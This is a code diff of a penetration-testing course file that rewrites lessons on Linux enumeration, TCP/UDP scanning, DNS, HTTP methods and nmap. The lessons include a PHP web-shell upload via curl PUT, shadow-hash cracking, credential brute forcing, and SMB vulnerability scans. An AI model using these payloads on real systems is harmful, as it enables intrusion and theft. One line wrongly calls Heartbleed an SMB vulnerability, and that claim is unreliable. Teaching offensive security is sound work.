@@ -57,9 +57,9 @@ export function buildStepImagePath(
   const roomDir = `room-${String(roomNum).padStart(2, '0')}`;
 
   const normalized = filename.trim().toLowerCase().replaceAll('_', '-');
-  const withStepPrefix = /^step-\d{2}-/.test(normalized)
+  const withStepPrefix = normalized.startsWith('step-')
     ? normalized
-    : normalized.replace(/^(\d+)-/, (_m, n) => `step-${String(Number(n)).padStart(2, '0')}-`);
+    : normalized.replace(/^(\d+)/, (m) => `step-${m.padStart(2, '0')}`);
 
   const encoded = withStepPrefix
     .split('/')
@@ -102,7 +102,7 @@ The field sits on the opposite side of defensive security (blue teaming), which 
 - **Vulnerability research** — discovering new, previously unknown vulnerabilities in software or hardware
 
 In your notes, write down the key difference between offensive and defensive security in your own words. Then write one sentence explaining why organisations pay people to attack their own systems.`,
-              image: '01-intro.png',
+              image: 'step-01.png',
             },
             {
               title: 'The HSOCIETY Operating Model',
@@ -116,7 +116,7 @@ In your notes, write down the key difference between offensive and defensive sec
 **Community** — Offensive security is a team sport. The HSOCIETY community is where you share findings, ask questions, collaborate on challenges, and build your reputation as an operator.
 
 Write down what each pillar means to you personally. Be specific — not "I want to learn hacking" but "I want to be able to conduct a web application penetration test independently within six months."`,
-              image: '02-model.png',
+              image: 'step-02.png',
             },
             {
               title: 'Career Paths in Offensive Security',
@@ -134,7 +134,7 @@ Write down what each pillar means to you personally. Be specific — not "I want
 **CTF Player** — Competes in Capture The Flag competitions. A great way to build skills and reputation. Many professionals started here.
 
 In your notes, rank these paths from most to least interesting to you and explain why. This is not a permanent decision — it is a starting point for your learning focus.`,
-              image: '03-roles.png',
+              image: 'step-03.png',
             },
           ],
         },
@@ -157,7 +157,7 @@ In your notes, rank these paths from most to least interesting to you and explai
 **3. Lateral thinking** — The ability to approach a problem from an unexpected angle. Security controls are designed to stop expected attacks. Lateral thinking is how you find the path the defender did not anticipate.
 
 For each trait, write a concrete example of how it would apply in a real engagement. Do not use generic examples — think of a specific scenario.`,
-              image: '01-mindset.png',
+              image: 'step-01.png',
             },
             {
               title: 'Applying the Mindset',
@@ -175,7 +175,7 @@ Pick any object near you — a door lock, a coffee machine, a website you use da
 This exercise is not trivial. The ability to ask these questions about any system — a web application, a network protocol, a physical lock — is the foundation of every vulnerability discovery.
 
 Write your answers for the object you chose. Be specific and detailed.`,
-              image: '02-apply.png',
+              image: 'step-02.png',
             },
             {
               title: 'Tools vs. Understanding',
@@ -191,7 +191,7 @@ An operator understands the underlying vulnerability — the memory corruption, 
 Every tool you use in this programme, you will understand from first principles before you use it. You will know what it does, why it works, and how to replicate its core function manually.
 
 In your notes, answer this question honestly: right now, are you closer to a tool runner or an operator? What specific knowledge gaps would you need to close to move further toward operator?`,
-              image: '03-discuss.png',
+              image: 'step-03.png',
             },
           ],
         },
@@ -305,7 +305,7 @@ ls -la ~
 \`\`\`
 
 In your notes, draw the directory structure you see. Mark which directories you think would be most interesting to an attacker and explain why.`,
-              image: '01-terminal.png',
+              image: 'step-01.png',
             },
             {
               title: 'Navigating the Filesystem',
@@ -342,7 +342,7 @@ find /etc -mtime -1 2>/dev/null
 The \`2>/dev/null\` at the end of find commands redirects error messages (permission denied, etc.) to /dev/null so they do not clutter your output. You will use this constantly.
 
 Practice: navigate to \`/etc\`, then to \`/var/log\`, then back to your home directory without using \`cd ~\`. Use \`pwd\` at each step to confirm where you are.`,
-              image: '02-navigate.png',
+              image: 'step-02.png',
             },
             {
               title: 'Understanding File Permissions',
@@ -376,7 +376,7 @@ find / -perm -o+w -type d 2>/dev/null
 \`\`\`
 
 Run the SUID search on your system and document every result. Look up any binaries you do not recognise.`,
-              image: '03-permissions.png',
+              image: 'step-03.png',
             },
             {
               title: 'Reading Files and Searching Content',
@@ -416,7 +416,7 @@ grep -A 2 -B 2 "root" /etc/passwd
 \`\`\`
 
 Practice: use \`grep\` to find all users in \`/etc/passwd\` who have \`/bin/bash\` as their shell. These are the accounts that can log in interactively — important for enumeration.`,
-              image: '04-reading.png',
+              image: 'step-04.png',
             },
           ],
         },
@@ -461,7 +461,7 @@ uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),27(sudo),1001(docker)
 - Group membership in \`adm\` gives access to system logs
 
 Run \`id\` on your system. Look up every group you are a member of and understand what access each one grants.`,
-              image: '01-id.png',
+              image: 'step-01.png',
             },
             {
               title: 'The passwd and shadow Files',
@@ -494,7 +494,7 @@ username:$hash_type$salt$hash:last_changed:min:max:warn:inactive:expire
 The hash type prefix tells you the algorithm: \`$1$\` = MD5 (weak), \`$5$\` = SHA-256, \`$6$\` = SHA-512 (current standard), \`$y$\` = yescrypt (modern).
 
 **Why this matters:** If you can read \`/etc/shadow\`, you can attempt to crack the hashes offline using tools like \`hashcat\` or \`john\`. This is a common post-exploitation step.`,
-              image: '02-passwd.png',
+              image: 'step-02.png',
             },
             {
               title: 'Changing Permissions and Ownership',
@@ -538,7 +538,7 @@ chmod -R 755 /var/www/html
 - \`0\` = --- (no permissions)
 
 Practice: create a script file, make it executable with \`chmod +x\`, and run it. Then remove the execute permission and try to run it again. Observe the error.`,
-              image: '03-chmod.png',
+              image: 'step-03.png',
             },
             {
               title: 'sudo and Privilege Escalation Basics',
@@ -580,7 +580,7 @@ User alice may run the following commands on target:
 Both \`find\` and \`vim\` can be used to escalate to a root shell. This is documented on GTFOBins (gtfobins.github.io) — a reference for Unix binaries that can be abused for privilege escalation.
 
 Run \`sudo -l\` on your system. Look up every binary listed on GTFOBins and document whether it can be used for privilege escalation.`,
-              image: '04-sudo.png',
+              image: 'step-04.png',
             },
           ],
         },
@@ -628,7 +628,7 @@ lsof -p 1234
 - Processes running from unusual directories like \`/tmp\`
 
 Run \`ps aux\` and identify every process running as root. For each one, ask: what does this process do, and what would happen if it were compromised?`,
-              image: '01-ps.png',
+              image: 'step-01.png',
             },
             {
               title: 'Network Enumeration',
@@ -670,7 +670,7 @@ tcp    LISTEN  0       511     127.0.0.1:3306       0.0.0.0:*          users:(("
 **Why the localhost-only services matter:** If you gain access to the system, you can access services that are not exposed to the network. A MySQL database on port 3306 that is not accessible externally becomes accessible once you have a shell.
 
 Run \`ss -tulnp\` on your system. For every listening service, note the port, the process, and whether it is accessible from the network or only locally.`,
-              image: '02-netstat.png',
+              image: 'step-02.png',
             },
             {
               title: 'Network Connectivity Tools',
@@ -709,7 +709,7 @@ nc 192.168.1.1 25
 **Banner grabbing** is the technique of connecting to a service and reading the initial response it sends. Many services announce their name and version in the banner — this is valuable reconnaissance information.
 
 Practice: use \`nc\` to connect to port 22 on your local machine. Read the SSH banner. What version of OpenSSH is running?`,
-              image: '03-ping.png',
+              image: 'step-03.png',
             },
             {
               title: 'Process Control',
@@ -751,7 +751,7 @@ tmux new-session -d -s mysession command
 - \`SIGKILL\` (signal 9) immediately terminates the process. It cannot be caught or ignored. Use this when a process is unresponsive.
 
 Practice: start a \`ping\` command in the background with \`ping google.com &\`. Find its PID with \`pgrep ping\`. Send it SIGTERM. Confirm it stopped with \`ps aux | grep ping\`.`,
-              image: '04-kill.png',
+              image: 'step-04.png',
             },
           ],
         },
@@ -800,7 +800,7 @@ bash hello.sh
 **The \`$(command)\` syntax** is called command substitution. It runs the command inside and replaces the \`$(...)\` with the output. This is how you capture command output and use it in your scripts.
 
 Write this script, run it, and confirm the output is correct before moving on.`,
-              image: 'step-01-ping-script.png',
+              image: 'step-01.png',
             },
             {
               title: 'Variables and Arguments',
@@ -851,7 +851,7 @@ ping -c 3 "$1"
 \`\`\`
 
 Run it with: \`./ping_host.sh google.com\``,
-              image: 'step-02-run-script.png',
+              image: 'step-02.png',
             },
             {
               title: 'Loops and Iteration',
@@ -896,7 +896,7 @@ done
 \`\`\`
 
 Write a script that reads a list of IP addresses from a file called \`targets.txt\` (one per line) and pings each one, printing whether it is up or down.`,
-              image: 'step-03-loop-ping.png',
+              image: 'step-03.png',
             },
             {
               title: 'Conditionals and Port Checking',
@@ -947,7 +947,7 @@ done
 \`\`\`
 
 Save this as \`portscan.sh\`, make it executable, and run it against your local machine: \`./portscan.sh 127.0.0.1\`. Document every open port you find.`,
-              image: 'step-04-port-scanner.png',
+              image: 'step-04.png',
             },
           ],
         },
@@ -970,86 +970,113 @@ Save this as \`portscan.sh\`, make it executable, and run it against your local 
             {
               title: 'The OSI Model',
               instruction:
-                `The OSI (Open Systems Interconnection) model describes network communication in seven layers. Every network attack operates at one or more of these layers.
+                `The OSI (Open Systems Interconnection) model is a conceptual framework that standardises network communication into seven distinct layers. As a hacker, you must understand where each attack lives.
 
-Layer 7 — Application: HTTP, HTTPS, DNS, SMTP, FTP, SSH. Attacks: SQLi, XSS, phishing.
-Layer 6 — Presentation: SSL/TLS, encoding. Attacks: SSL stripping.
-Layer 5 — Session: NetBIOS, RPC. Attacks: session hijacking.
-Layer 4 — Transport: TCP, UDP. Attacks: SYN flood, port scanning.
-Layer 3 — Network: IP, ICMP, ARP. Attacks: IP spoofing, ARP poisoning.
-Layer 2 — Data Link: Ethernet, Wi-Fi. Attacks: MAC spoofing.
-Layer 1 — Physical: cables, radio waves. Attacks: physical tapping.
+**Layer 7 — Application:** Where the user interacts. Protocols: HTTP, DNS, SSH, FTP.
+*   *Attacks:* SQL Injection, Cross-Site Scripting (XSS), API abuse, logic flaws.
+**Layer 6 — Presentation:** Data translation and encryption. Protocols: SSL/TLS, JPEG, GIF.
+*   *Attacks:* Downgrade attacks (forcing weaker encryption), padding oracle attacks.
+**Layer 5 — Session:** Manages connections between applications. Protocols: RPC, NetBIOS, Sockets.
+*   *Attacks:* Session hijacking, token theft, SMB relay attacks.
+**Layer 4 — Transport:** End-to-end communication and error checking. Protocols: TCP, UDP.
+*   *Attacks:* Port scanning, SYN flooding, sequence number prediction.
+**Layer 3 — Network:** Routing and addressing. Protocols: IP, ICMP, IPsec.
+*   *Attacks:* IP spoofing, ICMP redirect, router redirection.
+**Layer 2 — Data Link:** Data transfer between adjacent nodes. Protocols: Ethernet, Wi-Fi (802.11).
+*   *Attacks:* MAC flooding, ARP poisoning, VLAN hopping.
+**Layer 1 — Physical:** The physical hardware and transmission medium.
+*   *Attacks:* Physical tapping, RF jamming, rogue access points.
 
-Memory aid: "Please Do Not Throw Sausage Pizza Away" (Physical, Data Link, Network, Transport, Session, Presentation, Application).
+Memory aid: **"Please Do Not Throw Sausage Pizza Away"** (Physical, Data Link, Network, Transport, Session, Presentation, Application).
 
-Draw the model from memory. For each layer, write one attack that targets it.`,
-              image: '01-ls.png',
+**Exercise:** Map a standard web request (e.g., browsing to google.com) through all 7 layers. Identify which protocol is used at each stage.`,
+              image: 'step-01.png',
             },
             {
               title: 'The TCP Three-Way Handshake',
               instruction:
-                `TCP is connection-oriented. Before data is exchanged, a three-way handshake establishes the connection. Understanding this is essential for port scanning and many attacks.
+                `TCP (Transmission Control Protocol) is connection-oriented. Before any data can flow, a 3-way handshake must occur to synchronise sequence numbers and establish state.
 
-The handshake sequence:
+**The Sequence:**
+1.  **SYN (Synchronise):** Client sends a SYN packet to the server.
+2.  **SYN-ACK (Synchronise-Acknowledge):** Server responds with SYN and ACK.
+3.  **ACK (Acknowledge):** Client sends an ACK back to the server.
+
+**Scanning with nmap:**
 \`\`\`bash
-# SYN scan — sends SYN, waits for SYN-ACK, then sends RST (half-open, stealthy)
-sudo nmap -sS 192.168.1.1
+# SYN Stealth Scan (-sS): Sends SYN, receives SYN-ACK, sends RST. (Default, fast, stealthy)
+sudo nmap -sS -T4 10.10.10.5
 
-# Full connect scan — completes the handshake (no root required, more detectable)
-nmap -sT 192.168.1.1
+# Connect Scan (-sT): Completes the full 3-way handshake. (Easy to log, no root required)
+nmap -sT 10.10.10.5
+
+# ACK Scan (-sA): Used to map out firewall rules (Check if ports are filtered)
+sudo nmap -sA 10.10.10.5
+
+# Fin Scan (-sF): Sends FIN packet (Useful for bypassing some firewalls)
+sudo nmap -sF 10.10.10.5
+
+# Null Scan (-sN): Sends packet with no flags set
+sudo nmap -sN 10.10.10.5
 \`\`\`
 
-A SYN flood attack sends thousands of SYN packets without completing the handshake, exhausting the server's connection table — a denial-of-service attack.
-
-Capture a TCP handshake with Wireshark: start a capture, run \`curl http://example.com\`, filter for \`tcp\`, and find the three SYN/SYN-ACK/ACK packets. Identify each one.`,
-              image: '02-cd.png',
+**Deep Dive:** Use \`tcpdump -i any 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'\` to watch handshakes in real-time. Can you spot the flags being set in the packet headers?`,
+              image: 'step-02.png',
             },
             {
               title: 'TCP vs UDP',
               instruction:
-                `TCP is reliable and connection-oriented. UDP is fast and connectionless. Knowing which services use which protocol tells you how to scan and attack them.
+                `TCP is reliable (it guarantees delivery), whereas UDP is connectionless and "best-effort". Attackers target UDP because it often lacks the authentication found in complex TCP services.
 
-Common UDP services worth targeting:
+**Common TCP Ports:** 22 (SSH), 80 (HTTP), 443 (HTTPS), 445 (SMB), 3306 (MySQL), 3389 (RDP).
+**Common UDP Ports:** 53 (DNS), 67/68 (DHCP), 69 (TFTP), 123 (NTP), 161 (SNMP).
+
+**Advanced Scanning:**
 \`\`\`bash
-# UDP scan with nmap
-sudo nmap -sU 192.168.1.1
+# Standard UDP scan (Slow, as it waits for timeouts)
+sudo nmap -sU 10.10.10.5
 
-# Scan specific UDP ports
-sudo nmap -sU -p 53,67,68,69,123,161,162 192.168.1.1
+# Fast UDP scan (Top 100 ports)
+sudo nmap -sU -F 10.10.10.5
 
-# Query SNMP with default community string (port 161)
-snmpwalk -v2c -c public 192.168.1.1
+# Query SNMP community strings with onesixtyone
+onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt 10.10.10.5
+
+# Enumerate SNMP with snmp-check
+snmp-check 10.10.10.5
 \`\`\`
 
-Key UDP ports: 53 (DNS), 67 (DHCP), 69 (TFTP — often unauthenticated), 161 (SNMP — often uses default community strings), 123 (NTP).
-
-In your notes, list five UDP services and explain what information or access each one could provide to an attacker.`,
-              image: null,
+**Exercise:** List three scenarios where UDP would be preferred over TCP (e.g., VoIP, Streaming, DNS) and explain why packet loss is acceptable in those cases but not for file transfers.`,
+              image: 'step-03.png',
             },
             {
               title: 'Packet Capture with tcpdump',
               instruction:
-                `tcpdump captures network traffic from the command line. It is available on almost every Linux system and is essential for quick captures during an engagement.
+                `tcpdump is the "Swiss Army Knife" of network troubleshooting. It allows you to intercept and display TCP/IP and other packets being transmitted or received over a network.
 
+**Essential Filters:**
 \`\`\`bash
-# Capture all traffic on the default interface
-sudo tcpdump
+# Capture traffic on a specific interface
+sudo tcpdump -i eth0
 
-# Capture on a specific interface and save to file
-sudo tcpdump -i eth0 -w capture.pcap
+# Capture only traffic from a specific IP
+sudo tcpdump src 192.168.1.100
 
-# Capture only HTTP traffic
-sudo tcpdump -i eth0 port 80
+# Capture traffic on a specific port (e.g., DNS)
+sudo tcpdump port 53
 
-# Show packet contents in ASCII (useful for unencrypted protocols)
-sudo tcpdump -i eth0 -A port 80
+# Verbose output with Hex/ASCII (Useful for manual protocol analysis)
+sudo tcpdump -nvvv -X -s 0 host 10.10.10.5
 
-# Capture DNS traffic
-sudo tcpdump -i eth0 port 53
+# Capture only SYN packets (useful for spotting port scans)
+sudo tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'
+
+# Save to a PCAP file for Wireshark analysis
+sudo tcpdump -i any -w evidence.pcap
 \`\`\`
 
-Practical exercise: run \`sudo tcpdump -i eth0 -w http_capture.pcap port 80\`, then in another terminal run \`curl http://example.com\`, stop the capture, and open it in Wireshark. Find the HTTP GET request and the server response. What does the Server header reveal?`,
-              image: null,
+**Challenge:** Run \`tcpdump\` while performing an \`nmap\` scan against your own machine. Compare what \`nmap -sS\` looks like vs \`nmap -sT\`. Document the difference in the number of packets per port.`,
+              image: 'step-04.png',
             },
           ],
         },
@@ -1063,135 +1090,128 @@ Practical exercise: run \`sudo tcpdump -i eth0 -w http_capture.pcap port 80\`, t
             {
               title: 'DNS Deep Dive',
               instruction:
-                `DNS translates domain names to IP addresses. It is also a rich source of reconnaissance information.
+                `DNS (Domain Name System) is the phonebook of the internet. For an attacker, it is a goldmine of information about a target's internal and external infrastructure.
 
-DNS record types: A (IPv4), AAAA (IPv6), MX (mail), NS (name servers), TXT (SPF/DKIM), CNAME (alias), PTR (reverse), SOA (zone info).
+**Common Record Types:**
+*   **A:** IPv4 address.
+*   **AAAA:** IPv6 address.
+*   **MX:** Mail servers (identifies where emails are handled).
+*   **NS:** Name servers (identifies who manages the DNS).
+*   **TXT:** Text records (often contains SPF/DKIM/DMARC for email security).
+*   **CNAME:** Alias records.
 
+**Enumeration Commands:**
 \`\`\`bash
-# Query all record types
+# Query all common records
 dig google.com ANY
 
-# Query specific record types
+# Query specific records
 dig google.com MX
-dig google.com NS
 dig google.com TXT
 
-# Reverse DNS lookup
+# Use a specific DNS server (e.g., Google 8.8.8.8)
+dig @8.8.8.8 google.com
+
+# Reverse DNS lookup (IP to Domain)
 dig -x 8.8.8.8
+host 8.8.8.8
 
-# Attempt a DNS zone transfer (reveals all subdomains if misconfigured)
-dig axfr @nsztm1.digi.ninja zonetransfer.me
+# Attempt a Zone Transfer (AXFR) - If successful, it reveals ALL subdomains
+dig axfr @ns1.target.com target.com
 
-# Enumerate subdomains manually
-for SUB in www mail ftp admin vpn dev staging api; do
-    dig +short "$SUB.target.com"
-done
+# Brute force subdomains with a wordlist
+for sub in $(cat subdomains.txt); do host $sub.target.com; done
 \`\`\`
 
-A DNS zone transfer reveals every subdomain and IP in the zone — a complete map of the target's infrastructure. Try the zone transfer against zonetransfer.me (a deliberately vulnerable public example) and document every record returned.`,
-              image: '01-cat.png',
+**Vulnerability:** A misconfigured DNS server that allows **Zone Transfers** to any requester effectively hands over a map of the entire network. Try this against \`zonetransfer.me\` for a safe demonstration.`,
+              image: 'step-01.png',
             },
             {
               title: 'HTTP in Depth',
               instruction:
-                `HTTP is the foundation of the web. Every web attack operates over HTTP. You need to understand it at the packet level.
+                `HTTP (Hypertext Transfer Protocol) is the backbone of the web. Understanding its stateless nature and the headers used to manage state is crucial for web hacking.
 
+**Anatomy of a Request:**
+1.  **Request Line:** Method (GET/POST), Path (/index.html), Version (HTTP/1.1).
+2.  **Headers:** Host, User-Agent, Accept, Cookie.
+3.  **Body:** Data sent to the server (common in POST/PUT).
+
+**Mastering curl:**
 \`\`\`bash
-# Make a GET request and show all headers
+# Full verbose output (Headers + Body + Connection info)
 curl -v http://example.com
 
-# Make a POST request with form data
-curl -X POST -d "username=admin&password=test" http://example.com/login
-
-# Make a POST request with JSON
-curl -X POST -H "Content-Type: application/json" \
-     -d '{"username":"admin","password":"test"}' \
-     http://example.com/api/login
-
-# Show only response headers (useful for fingerprinting)
+# Fetch only response headers (Fingerprinting)
 curl -I http://example.com
 
-# Send a cookie
-curl -b "session=abc123" http://example.com/dashboard
+# Follow redirects (-L) and ignore SSL errors (-k)
+curl -IkL https://example.com
+
+# Custom User-Agent (Bypass simple browser-based blocks)
+curl -H "User-Agent: Mozilla/5.0 (Hacker; Linux x86_64)" http://example.com
+
+# Send data via POST (Form format)
+curl -X POST -d "param1=value1&param2=value2" http://example.com/login
+
+# Send JSON data
+curl -X POST -H "Content-Type: application/json" -d '{"id": 1, "status": "active"}' http://example.com/api
 \`\`\`
 
-Security-relevant headers to look for:
-\`\`\`bash
-# Run this and read every header
-curl -I https://target.com
-\`\`\`
-
-- \`Server: Apache/2.4.41\` — reveals server software and version
-- \`X-Powered-By: PHP/7.4.3\` — reveals backend technology
-- \`Set-Cookie: session=abc123\` — is HttpOnly set? Is Secure set?
-- Missing \`X-Frame-Options\` — clickjacking vulnerability
-- Missing \`Content-Security-Policy\` — XSS mitigation absent
-
-Run \`curl -I\` against a target and document every security-relevant header (or missing header).`,
+**Security Headers:** Look for \`Strict-Transport-Security\`, \`Content-Security-Policy\`, and \`X-Frame-Options\`. Their absence often indicates a vulnerable configuration.`,
               image: null,
             },
             {
               title: 'HTTP Methods and Their Abuse',
               instruction:
-                `HTTP methods define the intended action. Understanding each one — and how they can be abused — is essential for web application testing.
+                `HTTP defines a set of request methods to indicate the desired action to be performed. While GET and POST are common, others can be dangerous if misconfigured.
 
+**The Methods:**
+*   **GET:** Retrieve data.
+*   **POST:** Submit data.
+*   **PUT:** Upload/Replace a resource.
+*   **DELETE:** Remove a resource.
+*   **OPTIONS:** Describe communication options for the target resource.
+*   **TRACE:** Echoes back the received request (Can be used for Cross-Site Tracing).
+
+**Testing for Abuse:**
 \`\`\`bash
-# Discover what methods the server accepts
+# Check allowed methods
 curl -X OPTIONS http://example.com -v
 
-# Test if PUT is enabled (could allow file upload)
-curl -X PUT -d "test content" http://example.com/test.txt
+# Attempt to upload a web shell via PUT
+curl -X PUT -d "<?php system($_GET['cmd']); ?>" http://example.com/shell.php
 
-# Test if DELETE is enabled
-curl -X DELETE http://example.com/resource/1
-
-# Check the Allow header in the OPTIONS response
-curl -X OPTIONS http://target.com -v 2>&1 | grep -i allow
+# Test for TRACE (Check if sensitive headers are echoed)
+curl -X TRACE http://example.com -H "Cookie: secret_session_id=12345"
 \`\`\`
 
-Security implications: PUT/DELETE without authentication allows resource modification or deletion. TRACE enabled can be used in cross-site tracing (XST) attacks.
-
-Test a target with OPTIONS. Document every method it accepts. For any method beyond GET and POST, investigate whether it requires authentication.`,
+**Pro Tip:** Use **Burp Suite Repeater** to manually craft these requests and observe the server's response in detail. Many "hidden" APIs respond differently to different methods.`,
               image: null,
             },
             {
               title: 'Other Protocols: SMTP, FTP, SSH',
               instruction:
-                `These protocols are commonly found on targets and are frequently misconfigured.
+                `Beyond the web, other protocols provide critical services and often serve as entry points for attackers.
 
-SSH (port 22):
+**SSH (Secure Shell - Port 22):**
+*   *Recon:* \`nc -vn 10.10.10.5 22\` (Banner grab for version).
+*   *Attack:* Password spraying or using leaked private keys (\`ssh -i private.key user@host\`).
+
+**FTP (File Transfer Protocol - Port 21):**
+*   *Recon:* Check for anonymous login.
+*   \`ftp 10.10.10.5\` -> Username: \`anonymous\` -> Password: \`anonymous\`.
+*   *Command:* \`ls -R\` (List all files recursively).
+
+**SMTP (Simple Mail Transfer Protocol - Port 25):**
+*   *Recon:* Enumerate users using \`VRFY\` or \`EXPN\`.
 \`\`\`bash
-# Connect to a remote host
-ssh user@192.168.1.1
-
-# Banner grab (identify SSH version)
-nc 192.168.1.1 22
-
-# Brute force SSH (with permission only)
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
-\`\`\`
-
-FTP (port 21):
-\`\`\`bash
-# Check for anonymous login (common misconfiguration)
-ftp 192.168.1.1
-# Username: anonymous  Password: (press Enter)
-
-# Banner grab
-nc 192.168.1.1 21
-\`\`\`
-
-SMTP (port 25):
-\`\`\`bash
-# Banner grab and user enumeration
-nc 192.168.1.1 25
-EHLO attacker.com
+telnet 10.10.10.5 25
+HELO attacker.com
 VRFY admin
 VRFY root
-QUIT
 \`\`\`
 
-For each protocol, note: the port, what it exposes when misconfigured, and what tool you would use to test it.`,
+**Exercise:** Research the **"Banner Grabbing"** technique. Why is it important to know the exact version of a service before attempting an exploit?`,
               image: null,
             },
           ],
@@ -1206,124 +1226,116 @@ For each protocol, note: the port, what it exposes when misconfigured, and what 
             {
               title: 'nmap Fundamentals',
               instruction:
-                `nmap is the industry-standard tool for network discovery. Understanding what each scan type does at the packet level makes you a better operator.
+                `nmap (Network Mapper) is the industry standard for network discovery and security auditing. Mastering its flags is the difference between a noisy script-kiddie and a professional operator.
 
-Port states: Open (SYN-ACK received), Closed (RST received), Filtered (no response — firewall dropping).
+**Scan Types & Their Flags:**
+*   **-sS (SYN Scan):** The default "stealth" scan. It never completes the 3-way handshake.
+*   **-sT (Connect Scan):** Completes the handshake. Slower and more detectable, but doesn't require root.
+*   **-sU (UDP Scan):** Scans UDP ports. Often slow because UDP doesn't provide a response for open ports.
+*   **-sn (Ping Scan):** Discovers live hosts without scanning ports.
+
+**Performance & Timing (-T):**
+*   **-T0 / -T1:** Paranoid/Sneaky (Bypass IDS/IPS).
+*   **-T3:** Normal (Default).
+*   **-T4:** Aggressive (Fast, reliable on modern networks).
+*   **-T5:** Insane (Very fast, but can miss ports or crash services).
 
 \`\`\`bash
-# Basic scan — top 1000 TCP ports
-nmap 192.168.1.1
+# Scan a single host with service/version detection
+sudo nmap -sS -sV -T4 10.10.10.5
 
-# Scan all 65535 ports
-nmap -p- 192.168.1.1
+# Scan a subnet for live hosts
+nmap -sn 10.10.10.0/24
 
-# Scan specific ports
-nmap -p 22,80,443,3306 192.168.1.1
+# Scan all 65,535 ports (Use --min-rate for speed)
+sudo nmap -p- --min-rate 5000 10.10.10.5
 
-# Discover live hosts without port scanning
-nmap -sn 192.168.1.0/24
-
-# Skip host discovery (treat all hosts as online)
-nmap -Pn 192.168.1.1
-
-# SYN scan (stealthy, requires root)
-sudo nmap -sS 192.168.1.1
-
-# Fast scan — top 100 ports
-nmap -F 192.168.1.1
+# Packet tracing (See exactly what nmap sends and receives)
+sudo nmap -sS -p 80 --packet-trace 10.10.10.5
 \`\`\`
 
-Run a basic scan against your target. Document every open port. Before moving on, write down what service you expect on each port based on the port number alone.`,
+**Exercise:** Perform an \`nmap -sS\` scan while running \`tcpdump\`. Identify the SYN, SYN-ACK, and RST packets that make up the "Half-Open" scan.`,
               image: null,
             },
             {
               title: 'Service and Version Detection',
               instruction:
-                `Version detection tells you exactly what software is running — and what vulnerabilities it might have.
+                `Simply knowing a port is "open" isn't enough. You need to know exactly what is running on that port to find vulnerabilities.
+
+**Version Intensity (--version-intensity):**
+Ranges from 0 (light) to 9 (try all probes). Default is 7. Higher intensity finds more obscure services but takes longer.
 
 \`\`\`bash
-# Service version detection
-nmap -sV 192.168.1.1
+# Aggressive service detection and OS fingerprinting
+sudo nmap -sV -O --osscan-guess 10.10.10.5
 
-# OS detection (requires root)
-sudo nmap -O 192.168.1.1
+# All-in-one aggressive scan (-A)
+# (Equivalent to -sV -O -sC --traceroute)
+sudo nmap -A 10.10.10.5
 
-# Aggressive scan — OS, version, scripts, traceroute
-sudo nmap -A 192.168.1.1
-
-# Save output in all formats
-nmap -sV -oA scan_results 192.168.1.1
+# Output in multiple formats (Normal, XML, Greppable)
+nmap -sV -oA target_recon 10.10.10.5
 \`\`\`
 
-Once you have version numbers, search for known vulnerabilities:
-\`\`\`bash
-# Search the local exploit database
-searchsploit apache 2.4.41
-searchsploit openssh 7.4
+**Analyzing the Output:**
+Once you have a version (e.g., \`Apache 2.4.41\`), your next step is always vulnerability research.
+*   **searchsploit:** A local CLI tool for the Exploit-DB database.
+*   **Google:** \`Apache 2.4.41 exploit github\` or \`CVE-2021-...\`.
 
-# Search online: nvd.nist.gov, exploit-db.com, cve.mitre.org
-\`\`\`
-
-Run a version scan against your target. For every service detected, search for known CVEs affecting that version. Document your findings.`,
+**Tip:** Always verify the OS detection results against the service versions. If nmap says "Linux" but the service is "IIS 10.0", something is wrong.`,
               image: null,
             },
             {
               title: 'nmap Scripting Engine (NSE)',
               instruction:
-                `The NSE extends nmap with hundreds of scripts for enumeration, vulnerability detection, and more.
+                `The NSE is one of nmap's most powerful features. It allows users to write (and share) simple scripts to automate a wide variety of networking tasks.
+
+**Script Categories:** \`auth\`, \`broadcast\`, \`default\`, \`discovery\`, \`dos\`, \`exploit\`, \`external\`, \`fuzzer\`, \`intrusive\`, \`malware\`, \`safe\`, \`version\`, \`vuln\`.
 
 \`\`\`bash
-# Run default scripts
-nmap --script=default 192.168.1.1
+# Run all "default" and "safe" scripts
+nmap -sC 10.10.10.5
 
-# Run vulnerability scripts
-nmap --script=vuln 192.168.1.1
+# Specific vulnerability scanning
+nmap --script vuln 10.10.10.5
 
-# HTTP enumeration
-nmap --script=http-enum,http-title,http-methods,http-headers -p 80,443 192.168.1.1
+# Enumerate HTTP directories and titles
+nmap -p 80 --script http-enum,http-title 10.10.10.5
 
-# SMB enumeration (Windows targets)
-nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.1.1
+# Check for SMB vulnerabilities (Heartbleed, EternalBlue, etc.)
+nmap -p 445 --script "smb-vuln-*" 10.10.10.5
 
-# Check for EternalBlue (MS17-010)
-nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.1
-
-# MySQL enumeration
-nmap --script=mysql-info,mysql-databases -p 3306 192.168.1.1
-
-# FTP anonymous login check
-nmap --script=ftp-anon -p 21 192.168.1.1
-
-# List all available scripts
-ls /usr/share/nmap/scripts/
+# Brute force FTP credentials
+nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt 10.10.10.5
 \`\`\`
 
-Run the default scripts against your target. Document every piece of additional information gathered. Pay particular attention to any scripts that flag potential vulnerabilities.`,
+**Deep Dive:** Browse the \`/usr/share/nmap/scripts/\` directory on your machine. Read the code of a script like \`http-title.nse\` to see how it works under the hood.`,
               image: null,
             },
             {
               title: 'Building a Recon Workflow',
               instruction:
-                `Professional penetration testers follow a systematic enumeration workflow. This ensures nothing is missed and findings are reproducible.
+                `Professional hackers don't just run random commands; they follow a repeatable, structured workflow. This ensures consistency and prevents missing low-hanging fruit.
+
+**The "Professional" Pipeline:**
+1.  **Discovery:** Identify live hosts.
+2.  **Mapping:** Fast port scan of all 65,535 ports.
+3.  **Enumeration:** Targeted service/version/script scan on identified ports.
+4.  **Reporting:** Documenting and formatting findings for the next phase.
 
 \`\`\`bash
-# Phase 1: Host discovery
-sudo nmap -sn 192.168.1.0/24 -oG hosts.txt
-grep "Up" hosts.txt | awk '{print $2}' > live_hosts.txt
+# 1. Discover hosts and save as a list
+nmap -sn 10.10.10.0/24 -oG - | awk '/Up$/{print $2}' > live_hosts.txt
 
-# Phase 2: Fast port scan of all ports
